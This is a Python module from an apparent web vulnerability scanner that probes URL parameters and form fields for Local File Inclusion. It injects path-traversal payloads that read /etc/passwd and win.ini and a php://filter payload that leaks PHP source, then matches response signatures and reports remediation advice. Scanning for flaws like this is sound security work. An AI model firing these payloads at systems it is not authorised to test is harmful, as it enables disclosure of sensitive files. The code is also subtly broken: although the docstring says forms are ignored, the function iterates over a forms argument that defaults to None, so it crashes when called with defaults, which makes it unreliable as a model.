import requests
import base64
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import Dict, Any, Optional

from utils.logger import logger

def is_valid_base64_php_filter(response_text: str) -> bool:
    """
    Checks if the response indicates a successful PHP filter base64 leak.
    A successful leak often starts with base64 encoded PHP tags (PD9waHA).
    We will look for a long base64 string that decodes properly, or just the presence
    of long alphanumeric unspaced blocks that typify a raw source code dump.
    For simplicity, checking if it starts with PD9wa... which decodes to <?ph
    Or just trying to decode large words in the response.
    """
    if "PD9wa" in response_text or "base64" in response_text.lower():
        words = response_text.split()
        for word in words:
            if len(word) > 20:
                try:

                    padding = 4 - (len(word) % 4)
                    if padding and padding < 4:
                        word += "=" * padding
                    decoded = base64.b64decode(word).decode('utf-8', errors='ignore')
                    if "<?php" in decoded or "<?" in decoded or "function " in decoded:
                        return True
                except Exception:
                    continue
    return False

def execute(target: str, forms: Optional[list] = None, session: Optional[requests.Session] = None) -> Dict[str, Any]:
    """
    Execute Local File Inclusion (LFI) checks against the target URL.

    Args:
        target (str): The target URL to scan.
        forms (list): Optional list of forms (ignored for now, focusing on URL parameters).
        session (requests.Session): The optional authenticated session context.

    Returns:
        Dict[str, Any]: A dictionary containing the scan results.
    """
    logger.info(f"Starting LFI scan on target: {target}")
    req_client = session if session else requests

    lfi_payloads = [
        "../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]

    results: Dict[str, Any] = {
        "vulnerabilities_found": False,
        "details": []
    }

    parsed_url = urlparse(target)
    query_params = parse_qsl(parsed_url.query, keep_blank_values=True)

    if not query_params:
        logger.info(f"No query parameters found in {target} for LFI testing.")
        return results

    for payload in lfi_payloads:
        for i, (param_name, param_value) in enumerate(query_params):

            test_params = query_params.copy()
            test_params[i] = (param_name, payload)

            new_query = urlencode(test_params)
            test_url = urlunparse(parsed_url._replace(query=new_query))

            try:
                resp = req_client.get(test_url, timeout=10)
                text = resp.text

                vuln_detected = False
                evidence = ""


                if "root:x:0:0:" in text:
                    vuln_detected = True
                    evidence = "Found root:x:0:0: signature from /etc/passwd"

                elif "[extensions]" in text and ("app=" in text or "mci=" in text):
                    vuln_detected = True
                    evidence = "Found [extensions] signature from Windows win.ini"

                elif "php://filter" in payload and is_valid_base64_php_filter(text):
                    vuln_detected = True
                    evidence = "Found valid Base64 encoded PHP source code leakage"

                if vuln_detected:
                    logger.warning(f"[!] LFI Vulnerability Found: {test_url}")
                    results["vulnerabilities_found"] = True
                    results["details"].append({
                        "type": "Local File Inclusion (LFI)",
                        "severity": "High",
                        "parameter": param_name,
                        "payload": payload,
                        "url": test_url,
                        "evidence": evidence,
                        "remediation": "Validate and sanitize user input. Avoid passing user input directly to filesystem APIs. Use allow-lists for file inclusion."
                    })

            except requests.RequestException as e:
                logger.error(f"Request failed during LFI test on {test_url}: {e}")


    for form in forms:
        action = form.get("action", target)
        method = form.get("method", "get").upper()
        inputs = form.get("inputs", [])

        for payload in lfi_payloads:
            for target_input in inputs:
                input_name = target_input.get("name")
                if not input_name:
                    continue

                data_payload = {}
                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue
                    if name == input_name:
                        data_payload[name] = payload
                    else:
                        data_payload[name] = "test_lfi"

                try:
                    if method == "POST":
                        resp = req_client.post(action, data=data_payload, timeout=10)
                    else:
                        resp = req_client.get(action, params=data_payload, timeout=10)

                    text = resp.text
                    vuln_detected = False
                    evidence = ""

                    if "root:x:0:0:" in text:
                        vuln_detected = True
                        evidence = "Found root:x:0:0: signature from /etc/passwd"
                    elif "[extensions]" in text and ("app=" in text or "mci=" in text):
                        vuln_detected = True
                        evidence = "Found [extensions] signature from Windows win.ini"
                    elif "php://filter" in payload and is_valid_base64_php_filter(text):
                        vuln_detected = True
                        evidence = "Found valid Base64 encoded PHP source code leakage"

                    if vuln_detected:
                        logger.warning(f"[!] LFI Vulnerability Found in Form {method}: {action}")
                        results["vulnerabilities_found"] = True
                        results["details"].append({
                            "type": "Local File Inclusion (LFI)",
                            "severity": "High",
                            "parameter": input_name,
                            "payload": payload,
                            "url": action,
                            "evidence": evidence,
                            "remediation": "Validate and sanitize user input. Avoid passing user input directly to filesystem APIs."
                        })
                except requests.RequestException as e:
                    logger.error(f"Request failed during LFI form test on {action}: {e}")

    return results
